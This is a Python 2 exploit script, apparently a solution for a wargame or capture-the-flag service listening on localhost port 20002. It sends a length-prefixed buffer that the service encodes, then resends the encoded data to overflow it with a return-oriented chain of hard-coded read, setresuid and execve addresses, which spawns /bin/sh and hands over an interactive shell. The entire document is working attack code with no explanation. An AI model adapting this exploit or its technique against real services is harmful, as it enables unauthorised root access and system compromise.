import socket
import struct
import telnetlib

def recvall(s, size = 1024):
    chunks = ""
    while True:
        chunk = s.recv(size)
        chunks += chunk
        if (len(chunk) < size):
            break
    return chunks

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 20002))
s.recv(1024) # banner

base = 32
size = base * 4; 

print "1st stage: Decoding payload..."
payload = "E"
payload += struct.pack("I", size)
# payload += "A" * size

address = {}
address["read@plt"] = struct.pack("I", 0x08048860)
address["write@plt"] = struct.pack("I", 0x080489c0)
address["pop3ret"] = struct.pack("I", 0x08049529)
# address["pop2ret"] = struct.pack("I", 0x08048b12)
address["puts@got.plt"] = struct.pack("I", 0x0804b3b8) # writable address
address["execve@plt"] = struct.pack("I", 0x080489b0)
address["exit@plt"] = struct.pack("I", 0x08048960)
address["setresuid@plt"] = struct.pack("I", 0x08048850)

shell = "A" * 16 # padding
# shell += "BBBB"
shell += address["read@plt"]
shell += address["pop3ret"]
shell += "\x01\x00\x00\x00" # 0
shell += address["puts@got.plt"]
shell += "\x0c\x00\x00\x00" # 12
shell += address["setresuid@plt"]
shell += address["pop3ret"]
shell += "\x00\x00\x00\x00" # 0
shell += "\x00\x00\x00\x00" # 0
shell += "\x00\x00\x00\x00" # 0
shell += address["execve@plt"]
shell += address["exit@plt"]
shell += address["puts@got.plt"]
shell += "\x00\x00\x00\x00"
shell += "\x00\x00\x00\x00"
shell += "A" * (size - len(shell)) # padding

payload += shell
s.send(payload)

s.recv(1024) # confirmation
encoded = s.recv(1024)[5:]

print "len(encoded): ", len(encoded)
if (len(encoded) < size):
    print "invalid response length"
    exit(1)

print "\\x" + "\\x".join(x.encode("hex") for x in encoded)

print "2nd stage: Resending encoded payload..."
payload = "E"
payload += struct.pack("I", 4096 * base + size)
payload += encoded * (4096 * base / size)
payload += encoded
payload += "Q"

s.send(payload)

s.recv(1024) # confirmation
# decoded = s.recv(4096 * 24)[5:]
decoded = recvall(s, 4096)[5:]

# print "len(decoded): ", len(decoded)
# print "\\x" + "\\x".join(x.encode("hex") for x in decoded)

print "3rd stage: Spawning shell..."

s.send("/bin/sh\x00")

t = telnetlib.Telnet()
t.sock = s
t.interact()

